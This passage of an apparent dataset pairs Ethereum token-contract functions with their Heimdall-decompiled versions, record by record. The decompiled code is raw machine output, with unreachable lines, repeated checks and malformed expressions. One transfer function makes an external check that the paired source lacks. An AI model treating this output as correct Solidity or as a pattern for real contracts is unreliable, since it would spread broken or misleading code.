0x54726164696e672069732063757272656e746c792064697361626c65642e0000;\n        var_a = address(msg.sender);\n        var_b = 0x17;\n        if (!storage_map_b[var_a]) {\n            var_a = address(arg0);\n            var_b = 0x14;\n            if (storage_map_b[var_a]) {\n                var_a = address(arg0);\n                var_b = 0x17;\n                if (!storage_map_b[var_a]) {\n                    var_a = address(msg.sender);\n                    var_b = 0x14;\n                    require(!(!bytes1(storage_map_b[var_a])), \"Cannot Exceed tx wallet\");\n                    var_a = address(arg0);\n                    var_b = 0x14;\n                    require(!(!bytes1(storage_map_b[var_a])), \"Cannot Exceed tx wallet\");\n                    require(bytes1(storage_map_b[var_a]), \"Cannot Exceed tx wallet\");\n                    require(!(!bytes1(store_l)), \"Cannot Exceed tx wallet\");\n                }\n                var_a = address(msg.sender);\n                var_b = 0x14;\n                require(!(bytes1(storage_map_b[var_a])), \"Cannot Exceed tx wallet\");\n            }\n        }\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!(arg1 > (storage_map_b[var_a] + arg1)), \"Cannot Exceed tx wallet\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_b[var_a] + arg1) > maxWalletAmount), \"Cannot Exceed tx wallet\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x17;\n        var_g = 0x43616e6e6f74204578636565642074782077616c6c6574000000000000000000;\n        require(!(arg1 > maxTxAmount), \"Sell transfer amount exceeds the max sell.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x2a;\n        var_g = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_h = 0x206d61782073656c6c2e00000000000000000000000000000000000000000000;\n        if (!storage_map_b[var_a]) {\n        }\n        require(!(arg1 > maxTxAmount), \"Buy transfer amount exceeds the max buy.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x28;\n        var_g = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_h = 0x6d6178206275792e000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!(arg1 > (storage_map_b[var_a] + arg1)), \"Cannot Exceed max wallet\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_b[var_a] + arg1) > maxWalletAmount), \"Cannot Exceed max wallet\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x18;\n        var_g = 0x43616e6e6f7420457863656564206d61782077616c6c65740000000000000000;\n        if (!storage_map_b[var_a]) {\n        }\n        var_a = tx.origin;\n        var_b = 0x18;\n        require(block.number > storage_map_b[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x49;\n        var_g = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_h = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_i = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        if (address(uniswapV2Router) == (address(arg0))) {\n        }\n        require(address(msg.sender), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(arg0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = 0x60 + var_j;\n        var_d = 0x26;\n        var_k = this.code[14891:14929];\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        require(!(0 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        uint256 var_i = var_j.length;\n        uint256 var_m = 0;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xf4B4346B0E2220371B87bD140b89E4a4E57c10B7", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        var_a = 0x1c15158200000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_1c151582(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!(((var_c + ret0.length) - var_c) < 0x20), \"Slippage Invalid\");\n        require(!((arg1 - var_c.length) > arg1), \"Slippage Invalid\");\n        require((arg1 - var_c.length) > 0, \"Slippage Invalid\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x10;\n        var_g = 0x536c69707061676520496e76616c696400000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_h = address(msg.sender);\n        uint256 var_i = 0;\n        require(!(storage_map_e[var_h] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_j = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_h = address(msg.sender);\n        var_i = 0;\n        storage_map_e[var_h] = storage_map_e[var_h] - arg1;\n        var_h = address(arg0);\n        storage_map_e[var_h] = arg1 + storage_map_e[var_h];\n        uint256 var_d = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_h = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x11;\n    }"}
{"contract_address": "0x30F674e5399B6493A6096d239153b21331fbC670", "original_solidity_code": "function updateDevelopmentWalletInfo(address newWallet) external onlyOwner {\r\n        emit developmentWalletUpdated(newWallet, developmentWallet);\r\n        developmentWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevelopmentWalletInfo(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit developmentWalletUpdated(address(arg0), address(store_u));\n        store_u = (address(arg0)) | (uint96(store_u));\n    }"}
{"contract_address": "0xd0B4fb38f8B30Ee154db85790e555d71160107d4", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\n      require(_msgSender()==_taxWallet);\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\n      _finalBuyTax=_newFee;\n      _finalSellTax=_newFee;\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(address(msg.sender) == (address(store_p)));\n        require(arg0 > store_e);\n        require(!arg0 > store_e);\n        store_e = arg0;\n        store_q = arg0;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function set_New_Router_Address(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_Address(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        uniswapV2Router = (address(arg0) * 0x01) | (uint96(uniswapV2Router));\n    }"}
{"contract_address": "0x7435b0C4566F7eDe8d922841290a9cc552e1b96b", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x8bD394Bd4b52207Df7a12F4a3EBF089e3d632826", "original_solidity_code": "function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\\r\\n        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;\\r\\n        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), \\\"totalFee and sellFee cannot be more than 20%\\\");\\r\\n    }", "heimdall_decompiled_code": "function setTransactionRequirements(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6) public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        store_k = arg0;\n        store_o = arg1;\n        store_j = arg2;\n        store_p = arg3;\n        store_q = arg4;\n        store_r = arg5;\n        store_s = arg6;\n        require(0x01, \"totalFee and sellFee cannot be more than 20%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(!store_q > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        require(!(!store_q > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        require(!(store_q > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2c;\n        var_d = 0x746f74616c46656520616e642073656c6c4665652063616e6e6f74206265206d;\n        var_g = 0x6f7265207468616e203230250000000000000000000000000000000000000000;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xbC9683EE9525c4525e7e0dCFfe8eeD1447fd4287", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x95f7bFda575e002777B856665bD36D954c3aaa59", "original_solidity_code": "function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }", "heimdall_decompiled_code": "function approveMax(address arg0) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x06;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_j[var_a] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_c = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        emit Approval(address(msg.sender), address(arg0), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(newNum >= (totalSupply() * 3 / 1000)/1e18, \"Cannot set max wallet amount lower than 0.3%\");\r\n        maxWalletAmount = newNum * (10**18);\r\n        emit UpdatedMaxWalletAmount(maxWalletAmount);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x03) / 0x03)) | !0x03);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x99D795eEDe17E3400f1Dd664fc1578CD93df464f", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x058959bb6d006a69D74B22B508eDED1C615E8FDB", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0x243aA7135A82d62dc6847C1Ad5A2E7c87c01502d", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xB1fA6eb9B56F1dC8967969e17734Ba37ddA77E86", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function ownerOf(uint256 tokenId) public view override returns (address) {\\r\\n    return ownershipOf(tokenId).addr;\\r\\n  }", "heimdall_decompiled_code": "function ownerOf(uint256 arg0) public view returns (address) {\n        uint256 var_a = 0x40 + var_a;\n        uint256 var_b = 0;\n        uint256 var_c = 0;\n        require(totalSupply > arg0, \"ERC721A: unable to determine the owner of token\");\n        require(arg0 < 0x06, \"ERC721A: unable to determine the owner of token\");\n        require(!((arg0 - 0x06) > arg0), \"ERC721A: unable to determine the owner of token\");\n        require(!(0x01 > ((arg0 - 0x06) + 0x01)), \"ERC721A: unable to determine the owner of token\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_e = 0x11;\n        require(arg0 < ((arg0 - 0x06) + 0x01), \"ERC721A: unable to determine the owner of token\");\n        uint256 var_d = arg0;\n        var_f = 0x03;\n        var_a = 0x40 + var_a;\n        uint256 var_g = address(storage_map_s[var_d]);\n        uint256 var_h = uint64(storage_map_s[var_d] / 0x010000000000000000000000000000000000000000);\n        require(!(address(storage_map_s[var_d])), \"ERC721A: unable to determine the owner of token\");\n        uint256 var_i = address(var_a.length);\n        return address(var_a.length);\n        require(arg0, \"ERC721A: unable to determine the owner of token\");\n        require((0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg0) < ((arg0 - 0x06) + 0x01), \"ERC721A: unable to determine the owner of token\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x20;\n        var_k = 0x2f;\n        var_l = 0x455243373231413a20756e61626c6520746f2064657465726d696e6520746865;\n        var_m = 0x206f776e6572206f6620746f6b656e0000000000000000000000000000000000;\n        var_d = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg0;\n        var_f = 0x03;\n        var_a = 0x40 + var_a;\n        var_i = address(storage_map_s[var_d]);\n        uint256 var_n = uint64(storage_map_s[var_d] / 0x010000000000000000000000000000000000000000);\n        require(!(address(storage_map_s[var_d])), \"ERC721A: unable to determine the owner of token\");\n        uint256 var_o = address(var_a.length);\n        return address(var_a.length);\n        require(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg0, \"ERC721A: unable to determine the owner of token\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_e = 0x11;\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_e = 0x11;\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x2f;\n        var_j = 0x455243373231413a20756e61626c6520746f2064657465726d696e6520746865;\n        var_k = 0x206f776e6572206f6620746f6b656e0000000000000000000000000000000000;\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_e = 0x11;\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x2a;\n        var_j = 0x455243373231413a206f776e657220717565727920666f72206e6f6e65786973;\n        var_k = 0x74656e7420746f6b656e00000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_l[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function transfer(address to, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(0 - arg1, \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_b[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x1a;\n        require(bytes1(storage_map_b[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require((sellTotalFees == ((sellTotalFees * arg1) / arg1)) | !arg1, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - 0;\n        var_a = address(this);\n        storage_map_b[var_a] = var_b + storage_map_b[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!((arg1 - 0) > arg1), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x1c;\n        require(!(bytes1(storage_map_b[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: 